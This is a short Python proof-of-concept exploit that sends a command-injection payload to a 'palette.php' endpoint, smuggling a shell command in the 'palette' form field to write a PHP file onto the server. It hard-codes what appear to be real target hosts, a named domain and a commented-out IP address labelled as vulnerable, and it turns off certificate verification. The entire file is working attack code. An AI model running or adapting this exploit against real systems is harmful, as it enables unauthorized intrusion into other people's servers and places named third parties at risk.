import requests
import sys
import urllib3
# disable https not verify warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def verify(url):

    try:    
        target_url = url + "/palette.php"
        data = {
            'palette' : "1;  echo '<?php phpinfo(); ?>' > temp.php",
        }
        
        headers = {
            'Host': url.strip("http://").strip("https://"),
            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
        }
        
        response = requests.post(target_url,
                                 verify=False,
                                 data=data,
                                 headers=headers)

        print(response.text)

    except Exception as e:
        print(e)

if __name__ == '__main__':
    url = 'https://aux1.preditec.com'#'http://122.16.140.26/'  #vuln
    verify(url=url)